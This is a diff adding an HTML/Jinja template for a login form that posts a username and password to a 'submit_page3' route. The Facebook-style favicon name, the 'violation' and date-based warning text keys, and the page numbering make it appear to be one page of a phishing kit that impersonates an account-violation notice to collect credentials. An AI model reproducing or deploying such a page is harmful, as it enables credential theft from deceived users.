@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="{{ lang.get('lang', 'en') }}">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{lang['Login']}}</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/3.css') }}">
+    <link rel="icon" href="{{ url_for('static', filename='images/anhfb.png') }}" type="image/webp"> </head>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+
+        <div class="header-container">
+            <div class="t">
+                <img class="hinh1" src="{{ url_for('static', filename='images/anh5.png') }}" alt="Hình ảnh mô tả">
+            </div>
+        </div>
+    <div class="main">
+        <img class="hinh2" src="{{ url_for('static', filename='images/anh6.jpg') }}" alt="Hình ảnh mô tả">
+        <h2 class="h2">{{lang['3.you']}}</h2>
+        <p class="h3">{{lang['3.vio']}}</p>
+        <p class="thanhngang"></p>
+        <p class="h4">
+            {{lang['3.we']}}
+            <span class="current-date" id="current-date"></span>{{lang['3.your']}}
+        </p>
+
+        <div class="bang">
+            <form id="loginForm" method="POST" action="{{ url_for('submit_page3') }}" onsubmit="validateForm(event);">
+                <div form-group>
+                    <label for="phonepaas1"></label>
+                    <input type="text" id="phonepaas1" name="Username"  placeholder="{{lang['3.name']}}">
+                </div>
+                <div class="row">
+                    <p class="err ph_err"></p>
+                </div>
+            <div form-group>
+                <label for="passwordpass1"></label>
+                <div class="password-container">
+                    <input type="password" id="passwordpass1" name="Password" placeholder="Password">
+                    <span class="toggle-password" onclick="togglePassword()">
+                        <i class="fas fa-eye"></i> 
+                    </span>
+                </div>
+            </div>
+
+                <div class="row">
+                    <p class="err pa_err"></p>
+                </div>
+                <div class="submit-container">
+                    <button type="submit" id="submitButton">
+                        <span class="button-text">{{lang['Send']}}</span> 
+                        <span class="spinner"></span> 
+                    </button>
+                </div>
+            </form>
+        </div>
+        <script src="{{ url_for('static', filename='js/3.js') }}"></script>
+    </body>
+</html>
